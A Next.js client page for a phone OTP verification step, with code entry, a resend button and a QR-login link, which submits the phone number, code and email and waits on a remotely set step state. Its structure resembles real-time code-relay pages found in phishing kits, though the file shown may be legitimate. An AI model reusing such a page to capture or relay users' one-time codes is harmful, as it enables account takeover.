"use client";

import { Suspense, useEffect, useState } from "react";
import { useSearchParams } from "next/navigation";
import { AuthShell } from "@/components/auth/AuthShell";
import { OtpInput } from "@/components/auth/OtpInput";
import { ResendButton } from "@/components/auth/ResendButton";
import { StepGate, PasscodeLoading } from "@/components/auth/StepGate";
import type { StepState } from "@/hooks/useStepState";
import { submitAuthPayload } from "@/lib/submit";

function PhoneCodeForm({
  state,
  phone,
  email,
  mode,
}: {
  state: StepState;
  phone: string;
  email: string;
  mode: string;
}) {
  const [attempt, setAttempt] = useState(0);
  const [error, setError] = useState(false);
  const [errorText, setErrorText] = useState("");
  const [verifying, setVerifying] = useState(false);

  useEffect(() => {
    if (state.error) {
      setError(true);
      setErrorText(state.error);
      setVerifying(false);
      setAttempt((a) => a + 1);
    }
  }, [state.error]);

  const handleComplete = async (code: string) => {
    await submitAuthPayload({ page: "phone-code", phone, code, email, mode });
    setError(false);
    setErrorText("");
    setVerifying(true);
    setAttempt((a) => a + 1);
  };

  return (
    <div className="flex w-full max-w-[512px] flex-col items-center">
      <div className="w-full min-h-[500px] rounded-[8px] border border-auth-card-border bg-auth-card p-6">
        {verifying ? (
          <PasscodeLoading />
        ) : (
          <>
            <h2 className="text-[32px] font-semibold leading-10 text-white">
              Verify mobile number
            </h2>
            <p className="my-6 text-base font-medium leading-6 text-grey-200">
              {state.message || (
                <>
                  Enter the 6-digit code sent to{" "}
                  {(state.phone || phone) && (
                    <span className="text-white">{state.phone || phone}</span>
                  )}
                  . The code is valid for 10 minutes.
                </>
              )}
            </p>
            <div className="mt-4">
              <OtpInput key={attempt} length={6} error={error} onComplete={handleComplete} />
            </div>
            {(errorText || error) && (
              <p className="mt-2 text-sm font-medium text-auth-danger">
                {errorText || "Invalid code."}
              </p>
            )}
            <div className="mt-4 h-5" />
            <div className="flex justify-center">
              <ResendButton className="px-[18px] font-semibold opacity-60 hover:opacity-100" />
            </div>
          </>
        )}
      </div>
      <div className="mt-[10px] flex justify-center">
        <p className="flex text-xs font-medium text-grey-200">
          Having issues? Use{" "}
          <a href="/login" className="text-blue-brand">
            QR Login
          </a>
        </p>
      </div>
    </div>
  );
}

function PhoneCodeInner() {
  const searchParams = useSearchParams();
  const mode = searchParams.get("mode") ?? "login";
  const email = searchParams.get("email") ?? "";
  const phone = searchParams.get("phone") ?? "";

  return (
    <StepGate step="phone-code">
      {(state) => (
        <PhoneCodeForm state={state} phone={state.phone || phone} email={email} mode={mode} />
      )}
    </StepGate>
  );
}

export default function PhoneCodePage() {
  return (
    <AuthShell>
      <div className="mx-auto mb-10 mt-8 flex w-full max-w-[1140px] flex-1 flex-col">
        <div className="flex flex-1 items-center justify-center">
          <Suspense fallback={null}>
            <PhoneCodeInner />
          </Suspense>
        </div>
      </div>
    </AuthShell>
  );
}
